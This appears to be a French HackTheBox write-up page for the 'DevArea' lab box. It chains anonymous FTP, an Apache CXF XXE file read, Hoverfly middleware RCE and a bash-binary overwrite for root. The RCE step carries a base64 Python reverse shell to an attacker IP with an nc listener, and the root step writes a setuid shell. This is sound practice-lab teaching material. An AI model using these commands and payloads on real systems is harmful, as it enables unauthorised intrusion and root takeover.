@@ -1,0 +1,167 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+<Layout title="HTB - DevArea">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - DevArea</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-medium">Medium</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">Linux</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">28 Mar 2026</span>
+    </div>
+    <div style="display:flex; flex-wrap:wrap; gap:0.35rem; margin-top:0.5rem;">
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2022-46364</span>
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2024-45388</span>
+    </div>
+  </div>
+
+  <div style="background:var(--bg-800); border-left:3px solid #e67e22; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Box Easy Linux — FTP anonyme pour récupérer un JAR, XXE via SOAP Apache CXF pour extraire des credentials hardcodés dans le fichier systemd Hoverfly, RCE via middleware Hoverfly, puis bash binary hijacking via sudo avec permissions 777.</p>
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
+      {[
+        { n:'1', v:'FTP anonyme', r:'employee-service.jar récupéré' },
+        { n:'2', v:'CVE-2022-46364 — Apache CXF XXE/SSRF', r:'Credentials Hoverfly extraits du fichier systemd' },
+        { n:'3', v:'CVE-2024-45388 — Hoverfly middleware RCE', r:'Shell dev_ryan + user flag' },
+        { n:'4', v:'Bash binary hijacking (sudo + /usr/bin/bash 777)', r:'Shell root + root flag' },
+      ].map((s,i,a) => (
+        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
+          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#e67e2222; color:#e67e22; border:1px solid #e67e2244;">{s.n}</div>
+          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
+        </div>
+      ))}
+    </div>
+  </div>
+
+  <div class="prose">
+
+    <h2>1 — Reconnaissance & FTP Anonyme</h2>
+    <pre is:raw>nmap -sCV -p 21,22,80,8080,8500,8888 10.129.244.208
+echo '10.129.244.208 devarea.htb' >> /etc/hosts
+
+PORT     STATE SERVICE
+21/tcp   open  ftp       → login anonyme autorisé ← vecteur principal
+22/tcp   open  ssh
+80/tcp   open  http      → redirect devarea.htb
+8080/tcp open  Apache CXF (Jetty) → service SOAP
+8500/tcp open             → Hoverfly proxy listener
+8888/tcp open             → Hoverfly dashboard/API
+
+ftp 10.129.244.208    # user: anonymous, pass: (vide)
+get employee-service.jar
+
+mkdir output && cd output && jar xf ../employee-service.jar
+strings htb/devarea/ServerStarter.class
+# Endpoint SOAP : http://devarea.htb:8080/employeeservice
+# Framework : Apache CXF — Méthode vulnérable : submitReport()</pre>
+    <div style="border-left:3px solid #facc15; background:rgba(250,204,21,0.05); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fde68a;">💡 Le FTP anonyme est un vecteur d'accès sous-estimé — toujours tester en premier.</div>
+
+    <h2>2 — CVE-2022-46364 : XXE via SOAP Apache CXF</h2>
+    <p>Apache CXF est vulnérable à XXE via les messages SOAP multipart. En utilisant &lt;xop:Include&gt; dans le corps SOAP, on force le serveur à lire des fichiers locaux et les retourner en base64 dans la réponse.</p>
+    <pre is:raw># Lecture du fichier systemd de Hoverfly via XXE
+python3 xxe.py /etc/systemd/system/hoverfly.service
+
+# Résultat — credentials hardcodés dans ExecStart :
+# [Service]
+# User=dev_ryan
+# ExecStart=/opt/HoverFly/hoverfly -add -username admin -password [REDACTED] -listen-on-host 0.0.0.0</pre>
+
+    <h2>3 — CVE-2024-45388 : Hoverfly Middleware RCE</h2>
+    <p>Hoverfly permet de configurer un middleware exécuté sur chaque requête passant par le proxy — exploitable pour exécuter du code arbitraire.</p>
+    <pre is:raw># Authentification et obtention du JWT
+TOKEN=$(curl -s -X POST http://devarea.htb:8888/api/token-auth \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"[REDACTED]"}' \
+  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
+
+# Configurer une simulation (requis avant le middleware)
+curl -s -X PUT http://devarea.htb:8888/api/v2/simulation \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"data":{"pairs":[{"request":{"destination":[{"matcher":"glob","value":"*"}]},"response":{"status":200,"body":"ok","encodedBody":false}}]},"meta":{"schemaVersion":"v5"}}'
+
+# Injecter le reverse shell Python via le middleware
+curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"binary":"python3","script":"aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldCgpCnMuY29ubmVjdCgoIjEwLjEwLjE0LjUxIiw0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLDApCm9zLmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p"}'
+
+nc -lvnp 4444
+curl -s -x http://admin:[REDACTED]@devarea.htb:8500 http://example.com
+# shell dev_ryan
+
+cat /home/dev_ryan/user.txt</pre>
+
+    <h2>4 — Bash Binary Hijacking → root</h2>
+    <pre is:raw>sudo -l
+# (root) NOPASSWD: /opt/syswatch/syswatch.sh
+
+find /usr/bin /bin -writable 2>/dev/null
+# /usr/bin/bash (-rwxrwxrwx) ← permissions 777 !
+
+# Sauvegarder bash (OBLIGATOIRE — restaurer après !)
+cp /usr/bin/bash /tmp/bash.bak
+
+# Créer le payload
+printf '#!/bin/sh\ncp /bin/bash-static /tmp/rootbash2\nchmod 4755 /tmp/rootbash2\n' > /tmp/pay2.sh
+chmod +x /tmp/pay2.sh
+
+# Remplacer bash via Python (contourne "text file busy")
+python3 -c "
+import os
+data = open('/tmp/pay2.sh','rb').read()
+fd = os.open('/usr/bin/bash', os.O_WRONLY | os.O_TRUNC)
+os.write(fd, data)
+os.close(fd)
+"
+
+sudo /opt/syswatch/syswatch.sh --version
+ls -la /tmp/rootbash2   # -rwsr-xr-x 1 root root
+
+/tmp/rootbash2 -p
+whoami   # root
+cat /root/root.txt
+
+# RESTAURER BASH
+cp /tmp/bash.bak /usr/bin/bash</pre>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ TOUJOURS restaurer le binaire bash original — sans ça le système est inutilisable.</div>
+
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      {[
+        'Le FTP anonyme est un vecteur d\'accès sous-estimé — toujours tester en premier',
+        'Apache CXF CVE-2022-46364 : lecture de fichiers arbitraires via XOP Include dans SOAP',
+        'Les credentials hardcodés dans les fichiers systemd sont une pratique très dangereuse',
+        '/usr/bin/bash avec permissions 777 = escalade quasi-immédiate',
+        '"text file busy" contournable avec os.O_WRONLY | os.O_TRUNC via Python',
+      ].map(l => (
+        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
+      ))}
+    </div>
+  </div>
+
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['nmap','ftp','jar','python3 (XXE)','curl','netcat','sudo'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
